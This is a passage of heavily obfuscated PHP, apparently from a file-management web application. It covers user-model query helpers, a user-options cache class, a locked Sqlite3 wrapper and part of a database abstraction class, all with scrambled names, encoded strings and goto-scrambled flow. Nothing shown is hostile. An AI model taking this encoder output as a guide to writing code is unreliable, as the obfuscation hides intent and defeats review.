$eøè«²‰‡[1910] => 1, $eøè«²‰‡[1912] => 1); } private function _searchFromMeta($d­¢‹åÃŞº, $bƒ‰ò£†À—, $CùÊÒ½¼í) { goto C»»ÓõÒË§; cÏ‰ÖÛ×ø«: $EñØ»Ğ·…Ä = $this->parseWhereLike($EñØ»Ğ·…Ä); $Fµ…¨¯Şß” = Model($e­¼Ëù¨Óì[2141])->where($EñØ»Ğ·…Ä)->limit($CùÊÒ½¼í)->select(); if (!$Fµ…¨¯Şß”) { return array(); } goto c˜ï›¯‹»à; C»»ÓõÒË§: $e­¼Ëù¨Óì =& $_SERVER[Šº]; $bƒ‰ò£†À— = strtolower($bƒ‰ò£†À—); $EñØ»Ğ·…Ä = array($e­¼Ëù¨Óì[93] => $d­¢‹åÃŞº, $e­¼Ëù¨Óì[371] => array($e­¼Ëù¨Óì[379], "\45{$bƒ‰ò£†À—}\x25")); goto cÏ‰ÖÛ×ø«; c˜ï›¯‹»à: $Fµ…¨¯Şß” = array_to_keyvalue($Fµ…¨¯Şß”, $e­¼Ëù¨Óì[33], $e­¼Ëù¨Óì[1514]); $eĞŞÀ¢‡óÚ = $this->where(array($e­¼Ëù¨Óì[1506] => array($e­¼Ëù¨Óì[7], $Fµ…¨¯Şß”)))->select(); if (!$eĞŞÀ¢‡óÚ) { return array(); } goto CõËËĞ‹àÎ; CõËËĞ‹àÎ: return $eĞŞÀ¢‡óÚ; goto DÕ×²¸£È‰; DÕ×²¸£È‰: } private function _listDataApplyItem($bÆºß•á†Ù) { $b’İÁÖ©ÂÇ = array($bÆºß•á†Ù); $this->_listDataApply($b’İÁÖ©ÂÇ); return $b’İÁÖ©ÂÇ[0]; } private function _listDataApply(&$fÔÜ•å¡ö) { goto Aä’ŸªøÛ•; Aä’ŸªøÛ•: $C‘÷Š»®Š =& $_SERVER[Šº]; if (!$fÔÜ•å¡ö) { return; } array_remove_key($fÔÜ•å¡ö, $C‘÷Š»®Š[837]); goto EÄô¤­×§; EÄô¤­×§: $aÂñéŠäŸ’ = array_to_keyvalue($fÔÜ•å¡ö, $C‘÷Š»®Š[33], $C‘÷Š»®Š[1514]); $this->_listAppendGroup($fÔÜ•å¡ö, $aÂñéŠäŸ’); $this->_listAppendMeta($fÔÜ•å¡ö, $aÂñéŠäŸ’); goto AùÃä¦©ÌÛ; AùÃä¦©ÌÛ: $this->_listAppendSourceRoot($fÔÜ•å¡ö, $aÂñéŠäŸ’); goto C‚İÊƒ‡Ù; C‚İÊƒ‡Ù: } private function _listAppendSourceRoot(&$AªÈèìÖÔ¥, $cïØ³äùŸå) { goto Cõñ·Ë¨¢×; bÜíç·„ò¦: $D’ÉÏœàÕ = Model($bå¼½ƒİÖ®[788])->order($bå¼½ƒİÖ®[1771])->field($b»ëÙâˆ«)->where($fÎŞˆ§ôÒ)->select(); $D’ÉÏœàÕ = array_to_keyvalue($D’ÉÏœàÕ, $bå¼½ƒİÖ®[491]); $D’ÉÏœàÕ = array_remove_key($D’ÉÏœàÕ, $bå¼½ƒİÖ®[491]); goto d”¨…èö§¥; Cõñ·Ë¨¢×: $bå¼½ƒİÖ® =& $_SERVER[Šº]; $fÎŞˆ§ôÒ = array($bå¼½ƒİÖ®[485] => 0, $bå¼½ƒİÖ®[411] => SourceModel::TYPE_USER, $bå¼½ƒİÖ®[491] => array($bå¼½ƒİÖ®[7], $cïØ³äùŸå)); $b»ëÙâˆ« = $bå¼½ƒİÖ®[1770]; goto bÜíç·„ò¦; d”¨…èö§¥: foreach ($AªÈèìÖÔ¥ as &$AÎÌÑ›èî) { $AÎÌÑ›èî[$bå¼½ƒİÖ®[85]] = $D’ÉÏœàÕ[$AÎÌÑ›èî[$bå¼½ƒİÖ®[1514]]] ? $D’ÉÏœàÕ[$AÎÌÑ›èî[$bå¼½ƒİÖ®[1514]]] : array(); } unset($AÎÌÑ›èî); goto bÜ‰¬ª¹ñˆ; bÜ‰¬ª¹ñˆ: } private function _listAppendGroup(&$A†Ö°½³×†, $D¶¼ò“É—Å) { goto bƒŸ£İ ½; féÏŸ‹¼æ: $CùØæê§²ƒ = array_to_keyvalue($cÊÍÚùÃå, $B°ˆ«ÊäÜ›[33], $B°ˆ«ÊäÜ›[1677]); $CùØæê§²ƒ = array_remove_value(array_unique($CùØæê§²ƒ), $B°ˆ«ÊäÜ›[504]); if (!$CùØæê§²ƒ || !$cÊÍÚùÃå) { return; } goto C¹¾­¶×¹Ü; bƒŸ£İ ½: $B°ˆ«ÊäÜ› =& $_SERVER[Šº]; $d°•½Çíá = array($B°ˆ«ÊäÜ›[1514] => array($B°ˆ«ÊäÜ›[7], $D¶¼ò“É—Å)); $cÊÍÚùÃå = Model($B°ˆ«ÊäÜ›[1758])->where($d°•½Çíá)->select(); goto féÏŸ‹¼æ; d“ª¹‘ÑŠ: $cÊÍÚùÃå = array_to_keyvalue_group($cÊÍÚùÃå, $B°ˆ«ÊäÜ›[1514]); foreach ($cÊÍÚùÃå as &$c¤õÅÜÑÖØ) { $fÖš»¾Ä¾³ = array(); foreach ($c¤õÅÜÑÖØ as $dâº…—åì¥) { if (!$dâº…—åì¥[$B°ˆ«ÊäÜ›[1772]]) { continue; } $c´°§Ç©õ¤ = Model($B°ˆ«ÊäÜ›[1844])->listData($dâº…—åì¥[$B°ˆ«ÊäÜ›[1772]]); $fÖš»¾Ä¾³[] = array($B°ˆ«ÊäÜ›[1677] => $dâº…—åì¥[$B°ˆ«ÊäÜ›[1677]], $B°ˆ«ÊäÜ›[2143] => $A‰¹£Õ¥“¤[$dâº…—åì¥[$B°ˆ«ÊäÜ›[1677]]][$B°ˆ«ÊäÜ›[28]], $B°ˆ«ÊäÜ›[494] => $A‰¹£Õ¥“¤[$dâº…—åì¥[$B°ˆ«ÊäÜ›[1677]]][$B°ˆ«ÊäÜ›[494]], $B°ˆ«ÊäÜ›[413] => $c´°§Ç©õ¤); } $c¤õÅÜÑÖØ = $fÖš»¾Ä¾³; } unset($c¤õÅÜÑÖØ); goto BË‘èŸÁÁ; BË‘èŸÁÁ: foreach ($A†Ö°½³×† as &$cëğ›«´•¦) { $cëğ›«´•¦[$B°ˆ«ÊäÜ›[1851]] = array(); if (isset($cÊÍÚùÃå[$cëğ›«´•¦[$B°ˆ«ÊäÜ›[1514]]])) { $cëğ›«´•¦[$B°ˆ«ÊäÜ›[1851]] = $cÊÍÚùÃå[$cëğ›«´•¦[$B°ˆ«ÊäÜ›[1514]]]; } } unset($cëğ›«´•¦); goto E‰Ìš§Œİâ; C¹¾­¶×¹Ü: $d°•½Çíá = array($B°ˆ«ÊäÜ›[1677] => array($B°ˆ«ÊäÜ›[7], $CùØæê§²ƒ)); $A‰¹£Õ¥“¤ = Model($B°ˆ«ÊäÜ›[1849])->field($B°ˆ«ÊäÜ›[2142])->where($d°•½Çíá)->select(); $A‰¹£Õ¥“¤ = array_to_keyvalue($A‰¹£Õ¥“¤, $B°ˆ«ÊäÜ›[1677]); goto d“ª¹‘ÑŠ; E‰Ìš§Œİâ: } private function _listAppendMeta(&$dî§ãØìŒ‡, $f±¿ø›»²å) { goto A–¾¤ÛâˆÖ; E‚ÅŸ©µŒ: $e‚ˆÂãïê = array($ağÏ²—’¿™[1514] => array($ağÏ²—’¿™[7], $f±¿ø›»²å)); $cñ¦‘¦ò´ö = Model($ağÏ²—’¿™[2120])->where($e‚ˆÂãïê)->select(); $cñ¦‘¦ò´ö = array_to_keyvalue_group($cñ¦‘¦ò´ö, $ağÏ²—’¿™[1514]); goto E—–½à·‹¨; A–¾¤ÛâˆÖ: $ağÏ²—’¿™ =& $_SERVER[Šº]; $C‡ÕòÄÊ‹ = UserJobModel::JOB_KEY; $F¤›ÁÅš® = array($ağÏ²—’¿™[2122]); goto E‚ÅŸ©µŒ; E—–½à·‹¨: foreach ($cñ¦‘¦ò´ö as &$fˆõ êŠ…ç) { $BËÏŒĞôªÇ = array(); foreach ($fˆõ êŠ…ç as $f¤¤¼ˆ×Ò½) { if (!in_array($f¤¤¼ˆ×Ò½[$ağÏ²—’¿™[93]], $F¤›ÁÅš®)) { $BËÏŒĞôªÇ[$f¤¤¼ˆ×Ò½[$ağÏ²—’¿™[93]]] = $f¤¤¼ˆ×Ò½[$ağÏ²—’¿™[371]]; } } $fˆõ êŠ…ç = $BËÏŒĞôªÇ; } unset($fˆõ êŠ…ç); $EĞ¿êß½¤È = Model($ağÏ²—’¿™[2144]); goto FØ“‚­ó‘µ; FØ“‚­ó‘µ: foreach ($dî§ãØìŒ‡ as &$A‰ÔÜáèÙ’) { $C‘ë½§†Û = array(); if (isset($cñ¦‘¦ò´ö[$A‰ÔÜáèÙ’[$ağÏ²—’¿™[1514]]])) { $C‘ë½§†Û = $cñ¦‘¦ò´ö[$A‰ÔÜáèÙ’[$ağÏ²—’¿™[1514]]]; } $A‰ÔÜáèÙ’[$ağÏ²—’¿™[2145]] = array(); if (isset($C‘ë½§†Û[$C‡ÕòÄÊ‹])) { $A‰ÔÜáèÙ’[$ağÏ²—’¿™[2145]] = $EĞ¿êß½¤È->getUserJobInfo($C‘ë½§†Û[$C‡ÕòÄÊ‹]); } } unset($A‰ÔÜáèÙ’); goto DŠ»î„ã‘; DŠ»î„ã‘: } protected function groupUserAll($DÔ¬¿–åÀ°) { $dõÎºñ¸×˜ =& $_SERVER[Šº]; if (!$DÔ¬¿–åÀ°) { return !1; } $BØÚÆñá«ì = Model($dõÎºñ¸×˜[1758])->field($dõÎºñ¸×˜[1514])->where(array($dõÎºñ¸×˜[1677] => array($dõÎºñ¸×˜[7], $DÔ¬¿–åÀ°)))->select(); $BØÚÆñá«ì = array_to_keyvalue($BØÚÆñá«ì, $dõÎºñ¸×˜[33], $dõÎºñ¸×˜[1514]); return array_unique($BØÚÆñá«ì); } public function userSearch($e„Î¤Œ‡ƒã, $aÁ¨¸“éÈÅ = "\52") { return Model($_SERVER[Šº][514])->where($e„Î¤Œ‡ƒã)->field($aÁ¨¸“éÈÅ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\x72\137\x6f\160\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($f‚Š¹Ÿîô™) { $b“èÜØ©œÙ =& $_SERVER[Šº]; if (!defined($b“èÜØ©œÙ[461])) { define($b“èÜØ©œÙ[461], 0); } return "\125\163\x65\162\117\160\164\x69\157\156\x5f{$f‚Š¹Ÿîô™}\137" . USER_ID; } protected function filterWhere($f©šé—Ü‡) { $a¦…²Ëˆğ‚ =& $_SERVER[Šº]; if (!defined($a¦…²Ëˆğ‚[461])) { define($a¦…²Ëˆğ‚[461], 0); } $f©šé—Ü‡[$a¦…²Ëˆğ‚[1514]] = USER_ID; return $f©šé—Ü‡; } public function cacheRemoveUser($dóÏ£®ÔÑ, $D±¢Ş¯œöã) { return Cache::remove("\x55\163\x65\162\117\x70\164\151\157\156\137{$dóÏ£®ÔÑ}\x5f" . $D±¢Ş¯œöã); } protected function optionDefault($cƒàÙÂÏ‹ = '') { $cÉìˆ­‡ =& $_SERVER[Šº]; if ($cƒàÙÂÏ‹ == $cÉìˆ­‡[33]) { return $GLOBALS[$cÉìˆ­‡[6]][$cÉìˆ­‡[2146]]; } if ($cƒàÙÂÏ‹ == $cÉìˆ­‡[2147]) { return $GLOBALS[$cÉìˆ­‡[6]][$cÉìˆ­‡[2148]]; } } } goto bôîÌ‹†…–; FÕ©ÅâØÉ¯: class DbSqlite3 extends DbSqlite3Base { public function query($CøøÃ¬Â…) { $EŸÁ¾èàÈÔ =& $_SERVER[Šº]; if (!CacheLock::fileLock($EŸÁ¾èàÈÔ[9])) { return !1; } $bíèÏ½ÕÕË = parent::query($CøøÃ¬Â…); CacheLock::fileUnLock($EŸÁ¾èàÈÔ[9]); return $bíèÏ½ÕÕË; } public function execute($BÑ‹È°·åË) { $bñÏÚÌãù— =& $_SERVER[Šº]; if (!CacheLock::fileLock($bñÏÚÌãù—[9])) { return !1; } $eˆç°ÅÒŸ£ = parent::execute($BÑ‹È°·åË); CacheLock::fileUnLock($bñÏÚÌãù—[9]); return $eˆç°ÅÒŸ£; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\156\145\161" => "\74\x3e", "\147\x74" => "\76", "\145\147\x74" => "\76\x3d", "\x6c\164" => "\x3c", "\x65\x6c\x74" => "\74\x3d", "\156\157\164\x6c\151\153\145" => "\116\117\124\x20\x4c\111\x4b\105", "\154\x69\153\x65" => "\114\111\x4b\x45", "\151\x6e" => "\x49\x4e", "\x6e\x6f\x74\x69\x6e" => "\x4e\117\x54\x20\111\x4e", "\156\x6f\x74\x20\151\156" => "\x4e\117\124\40\111\x4e", "\x62\145\164\167\145\x65\x6e" => "\102\105\x54\127\x45\105\x4e", "\156\157\x74\x62\145\x74\167\x65\145\156" => "\116\x4f\124\40\102\105\x54\x57\105\x45\x4e", "\x6e\157\164\40\142\x65\164\167\145\145\x6e" => "\x4e\x4f\x54\40\x42\105\x54\127\105\105\x4e"); protected $selectSql = "\x53\105\x4c\105\103\x54\45\x44\111\123\x54\111\116\x43\x54\45\x20\45\x46\x49\105\114\104\45\x20\106\x52\117\115\40\45\124\101\102\x4c\x45\45\45\112\117\x49\116\45\45\127\110\x45\122\x45\x25\x25\x47\122\117\125\120\45\x25\110\x41\x56\x49\x4e\x47\45\x25\117\122\104\x45\122\45\x25\114\x49\x4d\x49\124\45\40\x25\125\x4e\x49\117\116\x25\45\x43\117\x4d\115\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $fÕÇëîÀ–£ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Šº][907], $fÕÇëîÀ–£); } public function factory($EÃÖÙÂÊß = '') { goto e˜Æ˜½ò™—; FéÓÈ‰ƒø÷: $this->dbType = ucwords(strtolower($EÃÖÙÂÊß[$BÂÜÄÖ‘š[908]])); $bËÖé¹†â§ = $BÂÜÄÖ‘š[910] . $this->dbType; if (class_exists($bËÖé¹†â§)) { $FĞ±Ü”¸¡ = new $bËÖé¹†â§($EÃÖÙÂÊß); if ($BÂÜÄÖ‘š[753] != strtolower($EÃÖÙÂÊß[$BÂÜÄÖ‘š[908]])) { $FĞ±Ü”¸¡->dbType = strtoupper($this->dbType); } else { $FĞ±Ü”¸¡->dbType = $this->_getDsnType($EÃÖÙÂÊß[$BÂÜÄÖ‘š[863]]); } } else { think_exception(think_lang($BÂÜÄÖ‘š[911]) . $BÂÜÄÖ‘š[912] . $bËÖé¹†â§); } goto dÑ“¤ßÓ˜©; dÑ“¤ßÓ˜©: return $FĞ±Ü”¸¡; goto DŒŞ—ïë¿ö; e˜Æ˜½ò™—: $BÂÜÄÖ‘š =& $_SERVER[Šº]; $EÃÖÙÂÊß = $this->parseConfig($EÃÖÙÂÊß); if (empty($EÃÖÙÂÊß[$BÂÜÄÖ‘š[908]])) { think_exception(think_lang($BÂÜÄÖ‘š[909])); } goto FéÓÈ‰ƒø÷; DŒŞ—ïë¿ö: } public function __call($A³·Ãâ†ç¹, $bÓ¡Á‚Üö¶) { if (method_exists($this, $A³·Ãâ†ç¹)) { return call_user_func_array(array($this, $A³·Ãâ†ç¹), $bÓ¡Á‚Üö¶); } } protected function _getDsnType($aï§˜¥ß‡â) { $C¼œ§½Í¿© = explode($_SERVER[Šº][4], $aï§˜¥ß‡â); $EÈ”Ñ‹Š†ø = strtoupper(trim($C¼œ§½Í¿©[0])); return $EÈ”Ñ‹Š†ø; } private function parseConfig($cÁ…Àâ¯Ç® = '') { $aƒÌÔëáÁ =& $_SERVER[Šº]; if (!empty($cÁ…Àâ¯Ç®) && is_string($cÁ…Àâ¯Ç®)) { $cÁ…Àâ¯Ç® = $this->parseDSN($cÁ…Àâ¯Ç®); } elseif (is_array($cÁ…Àâ¯Ç®)) { $cÁ…Àâ¯Ç® = array_change_key_case($cÁ…Àâ¯Ç®); $cÁ…Àâ¯Ç® = array($aƒÌÔëáÁ[908] => $cÁ…Àâ¯Ç®[$aƒÌÔëáÁ[752]], $aƒÌÔëáÁ[836] => $cÁ…Àâ¯Ç®[$aƒÌÔëáÁ[913]], $aƒÌÔëáÁ[837] => $cÁ…Àâ¯Ç®[$aƒÌÔëáÁ[914]], $aƒÌÔëáÁ[834] => $cÁ…Àâ¯Ç®[$aƒÌÔëáÁ[915]], $aƒÌÔëáÁ[835] => $cÁ…Àâ¯Ç®[$aƒÌÔëáÁ[916]], $aƒÌÔëáÁ[17] => $cÁ…Àâ¯Ç®[$aƒÌÔëáÁ[917]], $aƒÌÔëáÁ[863] => $cÁ…Àâ¯Ç®[$aƒÌÔëáÁ[754]], $aƒÌÔëáÁ[13] => isset($cÁ…Àâ¯Ç®[$aƒÌÔëáÁ[918]]) ? $cÁ…Àâ¯Ç®[$aƒÌÔëáÁ[918]] : array()); } elseif (empty($cÁ…Àâ¯Ç®)) { if (think_config($aƒÌÔëáÁ[919]) && $aƒÌÔëáÁ[753] != strtolower(think_config($aƒÌÔëáÁ[920]))) { $cÁ…Àâ¯Ç® = $this->parseDSN(think_config($aƒÌÔëáÁ[919])); } else { $cÁ…Àâ¯Ç® = array($aƒÌÔëáÁ[908] => think_config($aƒÌÔëáÁ[920]), $aƒÌÔëáÁ[836] => think_config($aƒÌÔëáÁ[921]), $aƒÌÔëáÁ[837] => think_config($aƒÌÔëáÁ[922]), $aƒÌÔëáÁ[834] => think_config($aƒÌÔëáÁ[923]), $aƒÌÔëáÁ[835] => think_config($aƒÌÔëáÁ[924]), $aƒÌÔëáÁ[17] => think_config($aƒÌÔëáÁ[243]), $aƒÌÔëáÁ[863] => think_config($aƒÌÔëáÁ[919]), $aƒÌÔëáÁ[13] => think_config($aƒÌÔëáÁ[925])); } } return $cÁ…Àâ¯Ç®; } protected function initConnect($eµ¼³£ËÇ = true) { if (1 == think_config($_SERVER[Šº][18])) { $this->_linkID = $this->multiConnect($eµ¼³£ËÇ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $aÓùí–´° => $dÆĞ•Ø›ùŠ) { $this->_linkID = $dÆĞ•Ø›ùŠ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($CÚ£²É»éÕ = false) { goto B±É«ÍÑå‡; F–šô‡†‘: $aË³‚ˆÊÀ™ = array($fÄäÃ¬Éß[836] => isset($cªÊ®†ÑÃä[$fÄäÃ¬Éß[836]][$aÖ§÷ĞÍÕ´]) ? $cªÊ®†ÑÃä[$fÄäÃ¬Éß[836]][$aÖ§÷ĞÍÕ´] : $cªÊ®†ÑÃä[$fÄäÃ¬Éß[836]][0], $fÄäÃ¬Éß[837] => isset($cªÊ®†ÑÃä[$fÄäÃ¬Éß[837]][$aÖ§÷ĞÍÕ´]) ? $cªÊ®†ÑÃä[$fÄäÃ¬Éß[837]][$aÖ§÷ĞÍÕ´] : $cªÊ®†ÑÃä[$fÄäÃ¬Éß[837]][0], $fÄäÃ¬Éß[834] => isset($cªÊ®†ÑÃä[$fÄäÃ¬Éß[834]][$aÖ§÷ĞÍÕ´]) ? $cªÊ®†ÑÃä[$fÄäÃ¬Éß[834]][$aÖ§÷ĞÍÕ´] : $cªÊ®†ÑÃä[$fÄäÃ¬Éß[834]][0], $fÄäÃ¬Éß[835] => isset($cªÊ®†ÑÃä[$fÄäÃ¬Éß[835]][$aÖ§÷ĞÍÕ´]) ? $cªÊ®†ÑÃä[$fÄäÃ¬Éß[835]][$aÖ§÷ĞÍÕ´] : $cªÊ®†ÑÃä[$fÄäÃ¬Éß[835]][0], $fÄäÃ¬Éß[17] => isset($cªÊ®†ÑÃä[$fÄäÃ¬Éß[17]][$aÖ§÷ĞÍÕ´]) ? $cªÊ®†ÑÃä[$fÄäÃ¬Éß[17]][$aÖ§÷ĞÍÕ´] : $cªÊ®†ÑÃä[$fÄäÃ¬Éß[17]][0], $fÄäÃ¬Éß[863] => isset($cªÊ®†ÑÃä[$fÄäÃ¬Éß[863]][$aÖ§÷ĞÍÕ´]) ? $cªÊ®†ÑÃä[$fÄäÃ¬Éß[863]][$aÖ§÷ĞÍÕ´] : $cªÊ®†ÑÃä[$fÄäÃ¬Éß[863]][0], $fÄäÃ¬Éß[13] => isset($cªÊ®†ÑÃä[$fÄäÃ¬Éß[13]][$aÖ§÷ĞÍÕ´]) ? $cªÊ®†ÑÃä[$fÄäÃ¬Éß[13]][$aÖ§÷ĞÍÕ´] : $cªÊ®†ÑÃä[$fÄäÃ¬Éß[13]][0]); return $this->connect($aË³‚ˆÊÀ™, $aÖ§÷ĞÍÕ´); goto C‘‚·àÆ; B±É«ÍÑå‡: $fÄäÃ¬Éß =& $_SERVER[Šº]; static $cªÊ®†ÑÃä = array(); static $a´Ç†¬ÏŸƒ = -1; goto bÅ„Ü±§Îî; bÅ„Ü±§Îî: if (empty($cªÊ®†ÑÃä)) { foreach ($this->config as $EéÜ¶¼¥àé => $E‰ÂÅ™ê´) { $cªÊ®†ÑÃä[$EéÜ¶¼¥àé] = explode($fÄäÃ¬Éß[47], $E‰ÂÅ™ê´); } } if (think_config($fÄäÃ¬Éß[926])) { if ($CÚ£²É»éÕ) { $aÖ§÷ĞÍÕ´ = floor(mt_rand(0, think_config($fÄäÃ¬Éß[927]) - 1)); $a´Ç†¬ÏŸƒ = $aÖ§÷ĞÍÕ´; } else { if (is_numeric(think_config($fÄäÃ¬Éß[928]))) { $aÖ§÷ĞÍÕ´ = think_config($fÄäÃ¬Éß[928]); } else { $aÖ§÷ĞÍÕ´ = floor(mt_rand(think_config($fÄäÃ¬Éß[927]), count($cªÊ®†ÑÃä[$fÄäÃ¬Éß[834]]) - 1)); } } } else { $aÖ§÷ĞÍÕ´ = floor(mt_rand(0, count($cªÊ®†ÑÃä[$fÄäÃ¬Éß[834]]) - 1)); $a´Ç†¬ÏŸƒ = $aÖ§÷ĞÍÕ´; } $aÖ§÷ĞÍÕ´ = $a´Ç†¬ÏŸƒ !== -1 ? $a´Ç†¬ÏŸƒ : $aÖ§÷ĞÍÕ´; goto F–šô‡†‘; C‘‚·àÆ: } public function parseDSN($BĞ×³‘Ùƒ) { $dŞŞŸŸì„Â =& $_SERVER[Šº]; if (empty($BĞ×³‘Ùƒ)) { return !1; } $e‰ç¤«¸ˆ = parse_url($BĞ×³‘Ùƒ); if ($e‰ç¤«¸ˆ[$dŞŞŸŸì„Â[174]]) { $C‹¬ñµçƒÜ = array($dŞŞŸŸì„Â[908] => $e‰ç¤«¸ˆ[$dŞŞŸŸì„Â[174]], $dŞŞŸŸì„Â[836] => isset($e‰ç¤«¸ˆ[$dŞŞŸŸì„Â[570]]) ? $e‰ç¤«¸ˆ[$dŞŞŸŸì„Â[570]] : $dŞŞŸŸì„Â[33], $dŞŞŸŸì„Â[837] => isset($e‰ç¤«¸ˆ[$dŞŞŸŸì„Â[929]]) ? $e‰ç¤«¸ˆ[$dŞŞŸŸì„Â[929]] : $dŞŞŸŸì„Â[33], $dŞŞŸŸì„Â[834] => isset($e‰ç¤«¸ˆ[$dŞŞŸŸì„Â[175]]) ? $e‰ç¤«¸ˆ[$dŞŞŸŸì„Â[175]] : $dŞŞŸŸì„Â[33], $dŞŞŸŸì„Â[835] => isset($e‰ç¤«¸ˆ[$dŞŞŸŸì„Â[176]]) ? $e‰ç¤«¸ˆ[$dŞŞŸŸì„Â[176]] : $dŞŞŸŸì„Â[33], $dŞŞŸŸì„Â[17] => isset($e‰ç¤«¸ˆ[$dŞŞŸŸì„Â[76]]) ? substr($e‰ç¤«¸ˆ[$dŞŞŸŸì„Â[76]], 1) : $dŞŞŸŸì„Â[33]); } else { preg_match($dŞŞŸŸì„Â[930], trim($BĞ×³‘Ùƒ), $a‹Âéêñ™ƒ); $C‹¬ñµçƒÜ = array($dŞŞŸŸì„Â[908] => $a‹Âéêñ™ƒ[1], $dŞŞŸŸì„Â[836] => $a‹Âéêñ™ƒ[2], $dŞŞŸŸì„Â[837] => $a‹Âéêñ™ƒ[3], $dŞŞŸŸì„Â[834] => $a‹Âéêñ™ƒ[4], $dŞŞŸŸì„Â[835] => $a‹Âéêñ™ƒ[5], $dŞŞŸŸì„Â[17] => $a‹Âéêñ™ƒ[6]); } $C‹¬ñµçƒÜ[$dŞŞŸŸì„Â[863]] = $dŞŞŸŸì„Â[33]; return $C‹¬ñµçƒÜ; } protected function debug() { $Aô¦øâ˜âÌ =& $_SERVER[Šº]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Aô¦øâ˜âÌ[931]; if (think_config($Aô¦øâ˜âÌ[932])) { think_status($Aô¦øâ˜âÌ[933]); think_trace($this->queryStr . $Aô¦øâ˜âÌ[934] . think_status($Aô¦øâ˜âÌ[20], $Aô¦øâ˜âÌ[933], 6) . $Aô¦øâ˜âÌ[935], $Aô¦øâ˜âÌ[33], $Aô¦øâ˜âÌ[936]); } } protected function parseLock($EÊ¦ç– = false) { $e’áéÎ™É· =& $_SERVER[Šº]; if (!$EÊ¦ç–) { return $e’áéÎ™É·[33]; } if ($e’áéÎ™É·[865] == $this->dbType) { return $e’áéÎ™É·[937]; } return $e’áéÎ™É·[938]; } protected function parseSet($DØœš…Ë®ù) { $BŠ†ç„ìÉ =& $_SERVER[Šº]; foreach ($DØœš…Ë®ù as $bë®ª‚Àà¼ => $EÂºí”±ê) { if (is_array($EÂºí”±ê) && $BŠ†ç„ìÉ[294] == $EÂºí”±ê[0]) { $d®æ¥åÑ÷[] = $this->parseKey($bë®ª‚Àà¼) . $BŠ†ç„ìÉ[939] . $EÂºí”±ê[1]; } elseif (is_scalar($EÂºí”±ê) || is_null($EÂºí”±ê)) { $d®æ¥åÑ÷[] = $this->parseKey($bë®ª‚Àà¼) . $BŠ†ç„ìÉ[939] . $this->parseValue($EÂºí”±ê); } } return $BŠ†ç„ìÉ[940] . implode($BŠ†ç„ìÉ[47], $d®æ¥åÑ÷); } protected function bindParam($cï‹Ù¦ö‘», $a®ÍÄˆòä¶) { $this->bind[$_SERVER[Šº][4] . $cï‹Ù¦ö‘»] = $a®ÍÄˆòä¶; } protected function parseBind($A¤Ÿõ¡°¬¼) { $A¤Ÿõ¡°¬¼ = array_merge($this->bind, $A¤Ÿõ¡°¬¼); $this->bind = array(); return $A¤Ÿõ¡°¬¼; } function parseKey(&$Fà…ØÒÆ•İ, $F¯à£˜Ş—ò = true) { if ($F¯à£˜Ş—ò) { $Fà…ØÒÆ•İ = $this->parseKeyCheck($Fà…ØÒÆ•İ); } return $Fà…ØÒÆ•İ; } function parseKeyCheck($e”»©Ç Ã) { $AîŠ®ğğÈ© =& $_SERVER[Šº]; $e”»©Ç Ã = trim($e”»©Ç Ã); if (!preg_match($AîŠ®ğğÈ©[941], $e”»©Ç Ã)) { think_exception($AîŠ®ğğÈ©[942] . $e”»©Ç Ã); } return $e”»©Ç Ã; } protected function parseValue($AÑÕÜà†´Å) { $EÔ›§»ß¤ç =& $_SERVER[Šº]; if (is_string($AÑÕÜà†´Å)) { $AÑÕÜà†´Å = $EÔ›§»ß¤ç[904] . $this->escapeString($AÑÕÜà†´Å) . $EÔ›§»ß¤ç[904]; } elseif (isset($AÑÕÜà†´Å[0]) && is_string($AÑÕÜà†´Å[0]) && strtolower($AÑÕÜà†´Å[0]) == $EÔ›§»ß¤ç[294]) { $AÑÕÜà†´Å = $this->escapeString($AÑÕÜà†´Å[1]); } elseif (is_array($AÑÕÜà†´Å)) { $AÑÕÜà†´Å = array_map(array($this, $EÔ›§»ß¤ç[905]), $AÑÕÜà†´Å); } elseif (is_bool($AÑÕÜà†´Å)) { $AÑÕÜà†´Å = $AÑÕÜà†´Å ? $EÔ›§»ß¤ç[87] : $EÔ›§»ß¤ç[504]; } elseif (is_null($AÑÕÜà†´Å)) { $AÑÕÜà†´Å = $EÔ›§»ß¤ç[103]; } return $AÑÕÜà†´Å; } protected function parseField($e´Ç´àÅš°) { $A“£ğŞÍ· =& $_SERVER[Šº]; if (is_string($e´Ç´àÅš°) && strpos($e´Ç´àÅš°, $A“£ğŞÍ·[47])) { $e´Ç´àÅš° = explode($A“£ğŞÍ·[47], $e´Ç´àÅš°); } if (is_array($e´Ç´àÅš°)) { $cª°¶Ê… ó = array(); foreach ($e´Ç´àÅš° as $fá²â‰Ãòø => $cò·¼Ûµ”) { if (!is_numeric($fá²â‰Ãòø)) { $cª°¶Ê… ó[] = $this->parseKey($fá²â‰Ãòø, !1) . $A“£ğŞÍ·[943] . $this->parseKey($cò·¼Ûµ”); } else { $cª°¶Ê… ó[] = $this->parseKey($cò·¼Ûµ”); } } $D’ëøèØ¨« = implode($A“£ğŞÍ·[47], $cª°¶Ê… ó); } elseif (is_string($e´Ç´àÅš°) && !empty($e´Ç´àÅš°)) { $D’ëøèØ¨« = $e´Ç´àÅš°; } else { $D’ëøèØ¨« = $A“£ğŞÍ·[182]; } return $D’ëøèØ¨«; } protected function parseTable($AÂçˆ“Åóƒ) { $D¢ã«È‘¼ =& $_SERVER[Šº]; if (is_array($AÂçˆ“Åóƒ)) { $f„ ƒ‘Ú‘¿ = array(); foreach ($AÂçˆ“Åóƒ as $cã¢¨¨óË => $b ­ÈôŞã) { if (!is_numeric($cã¢¨¨óË)) { $f„ ƒ‘Ú‘¿[] = $this->parseKey($cã¢¨¨óË) . 